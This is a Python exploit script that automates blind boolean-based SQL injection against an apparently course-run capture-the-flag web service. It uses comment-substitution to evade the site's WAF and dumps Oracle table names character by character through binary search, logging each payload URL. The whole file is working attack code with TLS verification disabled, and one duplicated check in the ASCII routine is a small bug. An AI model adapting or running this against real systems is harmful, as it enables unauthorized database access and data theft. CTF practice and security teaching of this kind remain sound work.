#!/usr/bin/env python3

import sys
import requests

import urllib3
urllib3.disable_warnings(
    urllib3.exceptions.InsecureRequestWarning)  # disable SSL warning


log_file = open('sql_injection_payload.log', 'w')


def write_log(log_str):
    log_file.write(log_str)


def determine_response_boolean(response):
    if response.text.find('zGcYabz3hYg') != -1:  # vid=1
        return True
    if response.text.find('7na_-LfGfpE') != -1:  # vid=2
        return False

    if response.text.find('Bad cat!') != -1:
        print('[WAF Encountered]')
        exit()

    if response.text.find('Error!') != -1:
        print('[SQL Syntax Error]')
        exit()

    raise RuntimeError("Unexpected HTTP Response")


def ConditionStr(lhs, op='=', num=0):
    return lhs + op + str(num)


def LenOfTableName(row=1):

    lhs = '(SELECT length(TABLE_NAME) FROM (SELECT TABLE_NAME , rownum as r FROM all_tables) WHERE r=%s)' % row

    if Verify(ConditionStr(lhs, '=', 0)):
        return 0

    if Verify(ConditionStr(lhs, '=', 1)):
        return 1

    lower_bound = 1
    upper_bound = 2

    while True:

        if Verify(ConditionStr(lhs, '>', upper_bound)):
            lower_bound = upper_bound
            upper_bound = upper_bound * 2
        else:
            break

    while True:
        if lower_bound + 1 == upper_bound:
            if Verify(ConditionStr(lhs, '=', lower_bound)):
                return lower_bound
            if Verify(ConditionStr(lhs, '=', upper_bound)):
                return upper_bound

        mid = (lower_bound + upper_bound)//2

        if Verify(ConditionStr(lhs, '=', mid)):
            return mid
        elif Verify(ConditionStr(lhs, '>', mid)):
            lower_bound = mid
        elif Verify(ConditionStr(lhs, '<', mid)):
            upper_bound = mid
        else:
            break

    raise RuntimeError("Unexpected!")


def StrOfTableName(row=1):
    strlen = LenOfTableName(row)

    str_query = '(SELECT TABLE_NAME FROM(SELECT TABLE_NAME, rownum as r FROM all_tables) WHERE r=%s)' % row

    ret_str = ""

    for i in range(strlen):
        char_ascii = "ascii(substr(%s,%d,%d))" % (str_query, i+1, i+1)
        char = chr(GetASCII(char_ascii))
        ret_str += char
        print(char, end="")
        sys.stdout.flush()

    return ret_str


def BypassWAF(s):
    return s.replace(' ', '/**/')


def GenerateURL(condition_str):
    # payload = '(case when (2=2) then 1 else 2 end)'
    payload = '(case when (%s) then 1 else 2 end)' % condition_str
    payload = BypassWAF(payload)
    prefix = 'https://edu-ctf.csie.org:10159/video.php?vid='
    url = prefix + payload
    return url


def Verify(condition_str):
    url = GenerateURL(condition_str)
    response = requests.get(url, verify=False)
    write_log(url)
    ret = determine_response_boolean(response)
    write_log(" ---> [TRUE]\n" if ret else " ---> [FALSE]\n")
    return ret


def GetASCII(char_ascii):

    condition_str = '%s=0' % (char_ascii)
    if Verify(condition_str):
        return 0

    condition_str = '%s=0' % (char_ascii)
    if Verify(condition_str):
        return 1

    lower_bound = 1
    upper_bound = 2

    while True:

        # condition_str1 = 'Length(%s)>%d' % (str_query, lower_bound)
        condition_str2 = '%s>%d' % (char_ascii, upper_bound)

        if Verify(condition_str2):
            lower_bound = upper_bound
            upper_bound = upper_bound * 2
        else:
            break

    while True:
        if lower_bound + 1 == upper_bound:
            condition_str1 = '%s=%d' % (char_ascii, lower_bound)
            condition_str2 = '%s=%d' % (char_ascii, upper_bound)
            if Verify(condition_str1):
                return lower_bound
            if Verify(condition_str2):
                return upper_bound

        mid = (lower_bound + upper_bound)//2

        condition_str1 = '%s=%d' % (char_ascii, mid)
        condition_str2 = '%s>%d' % (char_ascii, mid)
        condition_str3 = '%s<%d' % (char_ascii, mid)

        if Verify(condition_str1):
            return mid
        elif Verify(condition_str2):
            lower_bound = mid
        elif Verify(condition_str3):
            upper_bound = mid

    raise RuntimeError("Unexpected!")


def scan_table():
    for i in range(110):
        print('TableName[', i+1, '] = ', end="")
        sys.stdout.flush()

        table_name = StrOfTableName(row=i+1)

        print("")


def main():
    scan_table()
    return


if __name__ == "__main__":
    main()
